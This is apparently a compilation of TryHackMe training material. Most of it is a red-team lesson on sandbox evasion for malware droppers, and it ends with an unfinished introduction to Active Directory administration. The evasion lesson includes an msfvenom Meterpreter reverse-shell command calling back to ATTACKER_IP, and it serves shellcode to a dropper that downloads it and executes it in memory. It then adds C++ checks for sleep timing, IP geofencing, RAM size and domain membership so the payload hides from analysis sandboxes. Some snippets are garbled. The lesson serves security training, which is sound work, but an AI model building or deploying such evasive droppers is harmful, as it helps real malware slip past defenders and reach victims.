- VirusTotal ([Sample Submission Site](https://www.virustotal.com/))
- Any.Run ([Sample Submission Site](https://any.run/))
- Antiscan.me ([Sample Submission Site](https://antiscan.me/))
- Joe Sandbox ([Sample Submission Site](https://www.joesandbox.com/))

In the next section, we will learn about various techniques commonly 
deployed by Malware authors to gain an understanding of some evasion 
techniques that exist.

**Common Sandbox Evasion Techniques**

# An Introduction to Sandbox Evasion

Now
 that you have a general idea of what Malware Sandboxes are, we can move
 on to learning some evasion techniques at a high level. We will be 
breaking this down into four different categories; in the next task, we 
will implement four different evasion techniques (one from each 
category), so you can leave this room with some practical knowledge to 
help out in your Red Team operations.

We will be covering the following four broad categories:

- Sleeping through Sandboxes
- Geolocation and Geoblocking
- Checking System Information
- Querying Network Information

These are ordered from the most basic techniques to the most advanced. Let's get started.

# Sleeping through Sandboxes

Malware
 Sandboxes are often limited to a time constraint to prevent the 
overallocation of resources, which may increase the Sandboxes queue 
drastically. This is a crucial aspect that we can abuse; if we know that
 a Sandbox will only run for five minutes at any given time, we can 
implement a sleep timer that sleeps for five minutes before our 
shellcode is executed. This could be done in any number of ways; one 
common way is to query the current system time and, in a parallel 
thread, check and see how much time has elapsed. After the five minutes 
have passed, our program can begin normal execution.

Another 
popular method is to do complex, compute-heavy math, which may take a 
certain amount of time — for example, calculating the Fibonacci sequence
 up to a given number. Remember that it may take more or less time to do
 so based on the system's hardware. Masking
 your application is generally a good idea to avoid Anti-Virus 
detections in general, so this should already be something in your 
toolkit.

Beware that some 
sandboxes may alter built-in sleep functions; various Anti-Virus vendors
 have put out blog posts about bypassing built-in sleep functions. So it
 is highly recommended you develop your own sleep function. Here are a 
couple of blog posts about bypassing Sleep functions:

- [https://evasions.checkpoint.com/techniques/timing.html](https://evasions.checkpoint.com/techniques/timing.html)
- [https://www.joesecurity.org/blog/660946897093663167](https://www.joesecurity.org/blog/660946897093663167)

# Geolocation

One
 defining factor of Sandboxes is that they are often located off-premise
 and are hosted by Anti-Virus providers. If you know you are attacking 
TryHackMe, a European company, and your binary is executed in 
California, you can make an educated guess that the binary has ended up 
in a Sandbox. You may choose to implement a
 geolocation filter on your program that checks if the IP Address block 
is owned by the company you are targeting or if it is from a residential
 address space. There are several services that you can use to check 
this information:

- [ifconfig.me](https://ifconfig.me/)
- [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1)

IfConfig.me
 can be used to retrieve your current IP Address, with additional 
information being optional. Combining this with ARIN's RDAP allows you 
to determine the ISP returned in an easy to parse format (JSON).

It
 is important to note that this method will only work if the host has 
internet access. Some organizations may build a block list of specific 
domains, so you should be 100% sure that this method will work for the 
organization you are attempting to leverage this against.

# Checking System Information

Another
 incredibly popular method is to observe system information. Most 
Sandboxes typically have reduced resources. A popular Malware Sandbox 
service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e573e6b24f5adab546ec0034be6537d2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e573e6b24f5adab546ec0034be6537d2.png)

*a Screenshot of the SystemInfo command from Any.Run*

Most workstations in a network typically have 2-8 CPU
 cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is incredibly
 dependent on the organization that you are targeting, but generally, 
you can expect more than 2 CPU cores per system and more than 4GB of 
RAM. Knowing this, we can tailor our code to query for basic system info
 (CPU core count, RAM amount, Disk size, etc).

By no means is this an exhaustive list, but here are some additional examples of things you may be able to filter on:

- Storage Medium Serial Number
- PC Hostname
- BIOS/UEFI Version/Serial Number
- Windows Product Key/OS Version
- Network Adapter Information
- Virtualization Checks
- Current Signed in User
- and much more!

# Querying Network Information

The
 last method is the most open-ended method that we will be covering. 
Because of its open-endedness it is considered one of the more advanced 
methods as it involves querying information about the Active Directory 
domain.

Almost no Malware Sandboxes are joined
 in a domain, so it's relatively safe to assume if the machine is not 
joined to a domain, it is not the right target! However,
 you cannot always be too sure, so you should collect some information 
about the domain to be safe. There are many objects that you can query; 
here are some to consider:

- Computers
- User accounts
- Last User Login(s)
- Groups
- Domain Admins
- Enterprise Admins
- Domain Controllers
- Service Accounts
- DNS Servers

These
 techniques can vary in difficulty; therefore, you should consider how 
much time and effort you want to spend building out these evasion 
methods. A simple method, such as checking the systems environment 
variables (this can be done with **echo %VARIABLE%** or to display all variables, use the **set** command) for an item like the LogonServer, LogonUserSid, or LogonDomain may be much easier than implementing a Windows API.

# Setting the Stage

Now
 that you have a better understanding of what Sandbox Bypass method 
types exist, we will take it to the next step and implement some of the 
Sandbox Bypasses in the next task.

Before we move on to the next 
task, we're going to be starting with a basic dropper that retrieves 
shellcode from a Web Server (specifically from /index.raw) and injects 
it into memory, and executes the shellcode. It's important to note that 
all shellcode must be generated with MSFVenom in a raw format, and must 
be 64-bit, not 32-bit. It can be generated with the following command.

Generating Shellcode with MSFVenom

```
user@attack-box$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Saved as: index.raw
user@attack-box$ python3 -m http.server 8080ServingHTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.212 - - [20/Mar/2022 22:04:22] "GET /index.raw HTTP/1.1" 200 -

```

The shellcode should then be hosted on the AttackBox via any HTTP
 Server. Python3's http.server module is highly portable and flexible 
and will serve as a good base for this task. In the real world, you may 
host your shellcode on your C2 server. For the purposes of the lab, we 
will be utilizing the Attackbox with no C2 server.

The code
 attached to this task has been tested and compiled using Visual Studio 
2019 (or above). Download the dropper.cpp, and open it. It's
 important to note that there are several placeholder values on lines 
16, 22, 24, 27, and 33 that you must update to make the code function 
properly. Once you have altered the values, compile the code for a 
64-bit release.

**Implementing Various Evasion Techniques**

# Diving into Sandbox Evasion

With this base code acquired, we will take our first step into
 the world of Sandbox Evasion. We're going to start with our sleep 
because it is the simplest.

# Taking a Nap

We can take our template code from the previous task and add
 a Sleep statement for 120,000MS  to it. This translates to roughly 120 
seconds or 2 minutes. Generally, you would want a time closer to 5 
minutes to be sure; however, 2 minutes will suffice for testing 
purposes. We'll now add our Sleep statement in the main function:

`int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
}`

**Testing our Code**

After this is done, we can compile and upload the code to [Any.Run](http://any.run/). You can read along with the following tests, and see their behaviour on [Any.Run](http://any.run/)
 by following the links. This will serve as our test-ground for Sandbox 
evasion as it provides highly detailed information for us. Reviewing the
 two runs:

- [Sleep Bypass](https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b)
- [No Sleep Bypass](https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac)

Looking at the two results side by side, we notice no activity occurring in our Sleepy run.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/423f07b56f8ce5f9d353c3b96d0f0f35.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/423f07b56f8ce5f9d353c3b96d0f0f35.png)

*Screenshot from Any.Run showing our Sleep bypass function worked as intended.*

Where in our not-sleepy run, we can see an HTTP Request go out to Cloudflare.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cce67bc687e464e7ac65617233fe2c78.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cce67bc687e464e7ac65617233fe2c78.png)

*Screenshot from Any.Run showing our results with no Sandbox Evasion techniques implemented*

Congratulations! We have successfully created our first 
Sandbox Evasion technique. While this is a simple technique, it is 
incredibly powerful and has allowed us to run out Any.Run's one-minute 
timer. As stated in the last task, this method may or may not work due 
to various blog posts that have been published showing that Blue Teamers
 can create sleep timer bypasses. A better implementation would be to 
waste computing time by doing heavy math.

# Geolocation Filtering

Moving onto our next method of evading execution of our 
shellcode on a Sandbox, we will be leveraging Geolocation blocks. 
Fortunately, we will be able to leverage a good amount of code that is 
already written for us. Portions of the "downloadAndExecute()" function 
can be re-used for this. We will be reusing the following components:

- Website URL (formerly the c2URL variable)
- Internet Stream (formerly the stream variable)
- String variable (formerly the s variable)
- Buffer Space (formerly the Buff variable)
- Bytes Read (formerly the unsigned long bytesRead variable)
- Lastly, the [URLOpenBlockingStreamA](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)) function

Integrating This into our Code

This translates to an actual function that looks so:

```cpp
BOOL checkIP() {
 // Declare the Website URL that we would like to vicit
    const char* websiteURL = "<https://ifconfig.me/ip>";
 // Create an Internet Stream to access the website
    IStream* stream;
 // Create a string variable where we will store the string data received from the website
    string s;
  // Create a space in memory where we will store our IP Address
    char buff[35];
    unsigned long bytesRead;
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
 // While data is being sent from the webserver, write it to memory
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {
        return TRUE;
    }
    else {
    return FALSE;
    }
}
```

This code can be broken down into the following steps:

1. Declare the required variables mentioned above.
2. Open an internet stream with the URLOpenBlockingStreamA function to ifconfig.me/ip to check the current IP Address.
3. Write the data stream returned from the URLOpenBlockingStreamA function to the memory.
4. Append the data from the memory buffer to a string variable.
5. Check and see if the string data is equal to the Victim's IP Address.
6. If True, return TRUE; if False, return FALSE.

Now we must modify our main function so that we can leverage our newly created function:

```cpp
int main(){
    if(checkIP() == TRUE){
        downloadAndExecute();
        return 0;
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
        return 0;
    }
}
```

The
 code above invokes the new function, checkIP(), and if the IP Address 
returns TRUE, then invoke the downloadAndExecute() function to call the 
shellcode from our C2 server. If FALSE, return HTTP/418 - I'm a teapot!".

**Testing Our Code**

Now that we have wrapped up our second Sandbox Evasion 
technique, it is very important to know that this is an incredibly 
common TTP
 used by threat actors. Both APTs and Red Teams alike often use services
 to check the "Abuse Info" of an IP Address to gather information about 
an IP Address to determine if it is a legitimate company or not. [Any.Run](https://app.any.run/)
 is well aware of this Anti-Sandboxing technique and has even flagged it
 in our instance. You can see the detailed results at the links below:

- [One with an IP Address Filter](https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a)
- [One without an IP Address Filter](https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085)

Looking at the two results, we can see that ifconfig.me is 
flagged as a "questionable/Potentially Malicious" site used to check for
 your external IP Address. In fact, this Sandbox evasion method ended up
 hurting our score, so it should be used as a last resort *or* with a recently deployed/custom IP Address checking server. The full report can [be found here](https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4f9474a7e5ca35c0b58e09702fd966d7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4f9474a7e5ca35c0b58e09702fd966d7.png)

*A Screenshot from Any.Run showing our run with Sandbox Evasion techniques applied*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c5760cd217e139d3e40161fc901563b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/c5760cd217e139d3e40161fc901563b1.png)

*Screenshot from Any.Run showing an outbound HTTP Request*

As you are now aware, not all Sandbox escaping techniques 
may be helpful in certain situations; you must pick and choose which 
evasion techniques you are going to implement carefully, as some may do 
more harm than good.

# Checking System Information

We're going to start off the System Information category with - the amount of RAM
 a system has. It’s important to note that Windows measures data in a 
non-standard format. If you have ever bought a computer that said it has
 “256GB of SSD Storage”, after turning it on, you would have closer to 
240GB. This is because Windows measures data in units of 1024-bytes 
instead of 1000-bytes. Be warned that this can get very confusing very 
quickly. Fortunately for us, we will be working in such small amounts of
 memory that accuracy can be a “best guess” instead of an exact number. 
Now that we know this, how can we determine how much memory is installed
 on the System?

**Checking System Memory**

Fortunately, this is a relatively easy thing to find out. We 
only need the Windows header file included, and we can call a specific 
Windows API, [GlobalMemoryStatusEx](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex), to retrieve the data for us. To get this information, we must declare the [MEMORYSTATUSEX](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex) struct;
 then, we must set the size of the dwLength member to the size of the 
struct. Once that is done, we can then call the GlobalMemoryStatusEx 
Windows API to populate the struct with the memory information.

In this scenario, we are specifically interested in the total 
amount of physical memory installed on the system, so we will print out 
the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of 
the memory installed in the system in Bytes. We can then divide by 1024 
3x to get the value of memory installed in GiB. Now let’s see what this 
looks like in C++:

```cpp
#include <iostream>#include <Windows.h>using namespace std;
int main() {
// Declare the MEMORYSTATUSEX Struct
   MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct
   statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx WindowsAPI to get the current memory info    GlobalMemoryStatusEx(&statex);
// Print the physical memory installed on the system
   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
}
```

```
This code can be broken down into the following steps:We're going to declare the MEMORYSTATUSEX Struct; this will be populated with info from the GlobalMemoryStatusEx WinAPI.Now, we must set the length of the struct so that we can populate it with data. To do so, we're going to use the sizeof function.Now that we have the length of the struct, we can populate it with data from the GlobalMemoryStatusEx WinAPI.We can now read the total memory amount from the system.
```

Integrating This into our Code

Now that we have the technical know-how, we should 
integrate this check into our code. Generally speaking (You should 
verify this by yourself), most Sandboxes have 4GB of RAM
 dedicated to the machine, so we should check and see if the memory 
count is greater than 5; if it is not, exit the program; if it is, 
continue execution. We will not be modifying the downloadAndExecute 
function anymore; from here on, we will be adding new functions and changing the main function.

```cpp
BOOL memoryCheck() {
// This function will check and see if the system has 5+GB ofRAM// Declare the MEMORYSTATUSEX Struct
    MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct
    statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx WindowsAPI to get the current memory info    GlobalMemoryStatusEx(&statex);
// Checks if the System Memory is greater than 5.00GB
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
       return TRUE;
    } else {
       return FALSE;
    }
}

int main() {
// Evaluates if the installedRAM amount is greater than 5.00 GB,//if true download Shellcode, if false, exit the program.
if (memoryCheck() == TRUE) {
    downloadAndExecute();
    } else {
       exit;
    }
return 0;
}
```

```

```

This code can be broken down into the following steps:

1. We're creating a new function (memoryCheck) that will return True or False.
2. We use the previous code from above to get the size of the system memory.
3. We check if the system memory is greater than 5GB; if it is true, we return TRUE; if false, we return FALSE.
4. The value returned from the function determines if we download and execute stage 2 or not.

**Testing our Code**

Now
 that we have finished the second of our third Sandbox Evasion method, 
it is important that we test it to ensure that it works. To do so, we 
are going to upload our files to [Any.Run](http://any.run/)

- [One with the Memory Check function](https://app.any.run/tasks/e2f6a64b-02ef-43ca-bea5-e724b234001c)
- [One without the Memory Check function](https://app.any.run/tasks/7d06fc67-35c9-45f5-8865-af9dd6486075)

Looking
 at the two samples side by side shows some interesting differences; in 
the first submission, our memory check function works without any issue 
and gracefully exits the program when it notices the device has less 
than 5GB of RAM.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/18f24c068bf41867bb839c910c192de5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/18f24c068bf41867bb839c910c192de5.png)

*Screenshot from Any.Run verifying that our Memory Check function worked as intended*

In our unmodified, original code, we can see the HTTP GET Request to go out to an AWS Web Server to get Stage two.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1fb4c21ee81b9a5f979dba972c6e08ee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1fb4c21ee81b9a5f979dba972c6e08ee.png)

*Screenshot from Any.Run showing an outbound HTTP Request*

This shows that our code functions as 
intended! We can now move on to one of our final bypass categories - 
Querying Network Information.

# Querying Network Information

For our last evasion technique, we will be querying 
information about the Active Directory domain. We will be keeping it 
simple by querying the name of a Domain Controller using the [NetGetDCName](https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname) Windows API.
 This is a relatively simple Windows API that fetches the primary domain
 controller within the environment. This requires us to specify a 
pointer to a string for the DC Name to be put into. Implementing the 
function in C++ looks like so:

```cpp
BOOL isDomainController(){
// Create a long pointer to Wide String for ourDC Name to live in
    LPCWSTR dcName;
// Query the NetGetDCName Win32API for the Domain Controller NameNetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
// Convert the DCName from a Wide String to a String
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
    if ( dcNewName.find("\\\\"){
          return TRUE;
    } else {
          return FALSE;
    }
}
```

This code can be broken down into the following steps:

1. Declare two variables; one string, one LPCWSTR. The NetGetDCName WinAPI returns only an LPCWSTR.
2. Invoke the NetGetDCName Windows API. Two null values will be specified because we do not know the Server Name or the Domain Name of the environment we may be in
3. We convert the LPCWSTR to a normal string variable to check and see if the value is NULL (or, in the case of a string, "").
4. Execute the comparison statement and return True or False depending on the device name.

This
 will then call back to the Main() function which will then evaluate if 
it needs to download and execute our shellcode from the

C2

Server. The Main function now looks like so:

```cpp
int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
}
```

**Testing our Code**For
 our last Sandbox analysis, we will be using VirusTotal. Looking at the 
results of the SysInternals Sandbox, we can see that our Sandbox evasion
 technique worked. No outbound request to Cloudflare was made.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/be3ab6bfe807a0151ae966bf46b5084c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/be3ab6bfe807a0151ae966bf46b5084c.png)

*The Screenshot above shows that our malware did not reach out to our C2 Server.*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/792c6e1f9369ec2b0cb73f712a793bc3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/792c6e1f9369ec2b0cb73f712a793bc3.png)

*The Screenshot above shows that our malware reached out to our C2 Server for the second stage.*

# Adding External Dependencies in Visual Studio

For the final evasion method, we must add a new DLL
 to the project file. To do so, ensure your project is first opened. 
After it is opened, right-click on the Project name in the "Solution 
Explorer". In the image below, the Project name is called "Console 
Application2":

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/86020176cb2a5e8aed2e142d888cd3d4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/86020176cb2a5e8aed2e142d888cd3d4.png)

Click
 Properties at the bottom of the list; this will open a new view. Expand
 the "Linker" tab and select the "Input" submenu. We are interested in 
adding the Netapi32 Library.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5c8865dcd04ae30c2fc6c41c42386484.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5c8865dcd04ae30c2fc6c41c42386484.png)

To
 do so, click on the right side with all of the libraries referenced and
 add Netapi32.lib. Once it is added (like in the screenshot depicted 
above), press the "Apply" button and "Ok" to close the window and you 
are ready to continue development!

**DIY Sandbox Evasion Challenge**

# The Great Escape

Now
 that you have gained some experience in escaping Sandboxes, it's time 
for a challenge! In this task, you will be utilizing the code from Task 4
 to implement the "Ultimate Sandbox Evasion" method to escape 
TryHackMe's Sandbox program! In order to escape the Sandbox, you must 
implement the following techniques:

- Check and see if the device is joined to an Active Directory Domain
- Check if the system memory is greater than 1GB of RAM
- Implement an outbound HTTP request to 10.10.10.10
- Implement a 60-second sleep timer before your payload is retrieved from your web server

If your dropper meets these requirements specified above, the flag will be printed out to you.

Good luck and have fun!

*As
 a reminder, Task 4 contains downloadable source code from the four 
examples that may assist you in your Sandbox Evasion techniques. This 
material can also be found on the VM at* `C:\Users\Administrator\Desktop\Materials`*.*

*The Sandbox Evasion Techniques **can** fail.
 The program analyzes the binary to see if the checks are implemented. 
The outbound device may not have internet access - as long as the checks
 are implemented, the sandbox check should succeed.*

# Sandbox Evasion Binary

When
 you are finished developing your payload and are ready to test your 
evasion methods,  you can find the binary to check your dropper in `C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe`. Below is an example to show you how the program works:

THM Sandbox Binary Syntax

```
C:\Users\Administrator\Desktop\Materials\> .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag:
```

## **COMPROMISING ACTIVE DIRECTORY**

**ACTIVE DIRECTORY BASICS**

**Windows Domains**

Picture yourself 
administering a small business network with only five computers and five
 employees. In such a tiny network, you will probably be able to 
configure each computer separately without a problem. You will manually 
log into each computer, create users for whoever will use them, and make
 specific configurations for each employee's accounts. If a user's 
computer stops working, you will probably go to their place and fix the 
computer on-site.

While this sounds like a very relaxed lifestyle, let's suppose your 
business suddenly grows and now has 157 computers and 320 different 
users located across four different offices. Would you still be able to 
manage each computer as a separate entity, manually configure policies 
for each of the users across the network and provide on-site support for
 everyone? The answer is most likely no.

To overcome these limitations, we can use a Windows domain. Simply put, a **Windows domain**
 is a group of users and computers under the administration of a given 
business. The main idea behind a domain is to centralise the 
administration of common components of a Windows computer network in a 
single repository called **Active Directory (AD)**. The server that runs the Active Directory services is known as a **Domain Controller (DC)**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bebe5dfec0208bf563d01fa2dd1fb7a7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bebe5dfec0208bf563d01fa2dd1fb7a7.png)

The main advantages of having a configured Windows domain are:

- **Centralised identity management:** All users across the network can be configured from Active Directory with minimum effort.
- **Managing security policies:** You can configure
security policies directly from Active Directory and apply them to users and computers across the network as needed.

# A Real-World Example

If this sounds a bit confusing, chances are that you have already 
interacted with a Windows domain at some point in your school, 
university or work.

In school/university networks, you will often be provided with a 
username and password that you can use on any of the computers available
 on campus. Your credentials are valid for all machines because whenever
 you input them on a machine, it will forward the authentication process
 back to the Active Directory, where your credentials will be checked. 
Thanks to Active Directory, your credentials don't need to exist in each
 machine and are available throughout the network.

Active Directory is also the component that allows your 
school/university to restrict you from accessing the control panel on 
your school/university machines. Policies will usually be deployed 
throughout the network so that you don't have administrative privileges 
over those computers.

# Welcome to Inc.

During this task, we'll assume the role of the new IT admin at THM
 Inc. As our first task, we have been asked to review the current domain
 "THM.local" and do some additional configurations. You will have 
administrative credentials over a pre-configured Domain Controller (DC) 
to do the tasks.

**Active Directory**

The core of any Windows Domain is the **Active Directory Domain Service (AD DS)**.
 This service acts as a catalogue that holds the information of all of 
the "objects" that exist on your network. Amongst the many objects 
supported by AD, we have users, groups, machines, printers, shares and many others. Let's look at some of them:

***Users***

Users are one of the most common object types in Active Directory. Users are one of the objects known as **security principals**, meaning that they can be authenticated by the domain and can be assigned privileges over **resources** like files or printers. You could say that a security principal is an object that can act upon resources in the network.

Users can be used to represent two types of entities:

- **People:** users will generally represent persons in your organisation that need to access the network, like employees.
- **Services:** you can also define users to be used by
services like IIS or MSSQL. Every single service requires a user to run, but service users are different from regular users as they will only
have the privileges needed to run their specific service.

***Machines***

Machines
 are another type of object within Active Directory; for every computer 
that joins the Active Directory domain, a machine object will be 
created. Machines are also considered "security principals" and are 
assigned an account just as any regular user. This account has somewhat 
limited rights within the domain itself.

The machine accounts themselves are local administrators on the 
assigned computer, they are generally not supposed to be accessed by 
anyone except the computer itself, but as with any other account, if you
 have the password, you can use it to log in.

**Note:** Machine Account passwords are automatically rotated out and are generally comprised of 120 random characters.

Identifying machine accounts is relatively easy. They follow a 
specific naming scheme. The machine account name is the computer's name 
followed by a dollar sign. For example, a machine named `DC01` will have a machine account called `DC01$`.

***Security Groups***

If
 you are familiar with Windows, you probably know that you can define 
user groups to assign access rights to files or other resources to 
entire groups instead of single users. This allows for better 
manageability as you can add users to an existing group, and they will 
automatically inherit all of the group's privileges. Security groups are
 also considered security principals and, therefore, can have privileges
 over resources on the network.

Groups can have both users and machines as members. If needed, groups can include other groups as well.

Several groups are created by default in a domain that can be used to
 grant specific privileges to users. As an example, here are some of the
 most important groups in a domain:

| **Security Group** | **Description** |
| --- | --- |
| Domain Admins | Users
 of this group have administrative privileges over the entire domain. By
 default, they can administer any computer on the domain, including the 
DCs. |
| Server Operators | Users in this group can administer Domain Controllers. They cannot change any administrative group memberships. |
| Backup Operators | Users
 in this group are allowed to access any file, ignoring their 
permissions. They are used to perform backups of data on computers. |
| Account Operators | Users in this group can create or modify other accounts in the domain. |
| Domain Users | Includes all existing user accounts in the domain. |
| Domain Computers | Includes all existing computers in the domain. |
| Domain Controllers | Includes all existing DCs on the domain. |

You can obtain the complete list of default security groups from the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups).

# Active Directory Users and Computers

To configure users, groups or machines in Active Directory, we need 
to log in to the Domain Controller and run "Active Directory Users and 
Computers" from the start menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11d01963392078c1450300d2881f9160.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11d01963392078c1450300d2881f9160.png)

This will open up a window where you can see the hierarchy of users, 
computers and groups that exist in the domain. These objects are 
organised in **Organizational Units (OUs)** which are container objects that allow you to classify users and machines. OUs
 are mainly used to define sets of users with similar policing 
requirements. The people in the Sales department of your organisation 
are likely to have a different set of policies applied than the people 
in IT, for example. Keep in mind that a user can only be a part of a 
single OU at a time.

Checking our machine, we can see that there is already an OU called `THM`
 with four child OUs for the IT, Management, Marketing and Sales 
departments. It is very typical to see the OUs mimic the business' 
structure, as it allows for efficiently deploying baseline policies that
 apply to entire departments. Remember that while this would be the 
expected model most of the time, you can define OUs arbitrarily. Feel 
free to right-click the `THM` OU and create a new OU under it called `Students` just for the fun of it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c5b1d321108bc065771eba62d24f5e83.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c5b1d321108bc065771eba62d24f5e83.png)

If you open any OUs, you can see the users they contain and perform 
simple tasks like creating, deleting or modifying them as needed. You 
can also reset passwords if needed (pretty useful for the helpdesk):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/76e01efece5a00cc91f7099226130c5c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/76e01efece5a00cc91f7099226130c5c.png)

You probably noticed already that there are other default containers apart from the THM OU. These containers are created by Windows automatically and contain the following:

- **Builtin:** Contains default groups available to any Windows host.
- **Computers:** Any machine joining the network will be put here by default. You can move them if needed.
- **Domain Controllers:** Default OU that contains the DCs in your network.
- **Users:** Default users and groups that apply to a domain-wide context.
- **Managed Service Accounts:** Holds accounts used by services in your Windows domain.

# Security Groups vs OUs

You
 are probably wondering why we have both groups and OUs. While both are 
used to classify users and computers, their purposes are entirely 
different:

- **OUs** are handy for **applying policies** to users and computers, which include specific configurations that
pertain to sets of users depending on their particular role in the
enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn't make sense to try to apply two different sets of policies to a single user.
- **Security Groups**, on the other hand, are used to **grant permissions over resources**. For example, you will use groups if you want to allow some users to
access a shared folder or network printer. A user can be a part of many
groups, which is needed to grant access to multiple resources.

**Managing Users in AD**

Your first task as the new domain administrator is to check the existing AD
 OUs and users, as some recent changes have happened to the business. 
You have been given the following organisational chart and are expected 
to make changes to the AD to match it:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/88f0ade5a672ae681639e6049406a4ec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/88f0ade5a672ae681639e6049406a4ec.png)

# Deleting extra OUs and users

The first thing you should notice is that there is an additional department OU
 in your current AD configuration that doesn't appear in the chart. 
We've been told it was closed due to budget cuts and should be removed 
from the domain. If you try to right-click and delete the OU, you will 
get the following error:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/38edaf4a8665c257c62556096c69cb6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/38edaf4a8665c257c62556096c69cb6f.png)

By default, OUs are protected against accidental deletion. To delete the OU, we need to enable the **Advanced Features** in the View menu:

